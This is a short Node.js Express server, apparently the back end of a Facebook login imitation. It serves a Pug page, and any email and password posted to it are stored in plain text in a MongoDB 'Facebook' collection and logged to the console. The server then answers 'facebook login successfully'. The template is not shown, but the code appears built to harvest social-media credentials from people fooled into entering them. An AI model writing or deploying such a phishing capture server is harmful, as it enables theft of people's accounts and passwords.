const express = require("express");
const app = express();
const mongoose =require('mongoose');
mongoose.connect('mongodb://localhost/rajat', {useNewUrlParser: true, useUnifiedTopology: true });
const path =require('path');
const port = 3000;

//Define mongoose schema
const facebookSchema = new mongoose.Schema({
    email: String,
    password: String,
});
//Define schema model
const Facebook = mongoose.model('Facebook', facebookSchema);

//EXPRESS SPECIFICE STUFF
app.use('/static',express.static('static'));        //for serving statice files
app.use(express.urlencoded())                       //to get data to express

//PUG SPECIFICE STUFF
app.set('view engine', 'pug')                       //set templates engin as pug
app.set('views',path.join(__dirname,'views'));      //set views directory

//ENDSPOINT
app.get('/',(req,res)=>{
   
    res.status(200).render('index.pug');
})

app.post('/',(req,res)=>{
    var myData = new Facebook(req.body);
    console.log(req.body);
    myData.save().then(()=>{
        res.status(200).send('facebook login successfully')
    }).catch(()=>{
        res.status(400).send("Items not send to database")
    })

})
//START THE SERVER
app.listen(port,()=>{
    console.log("Server running.........");
}) 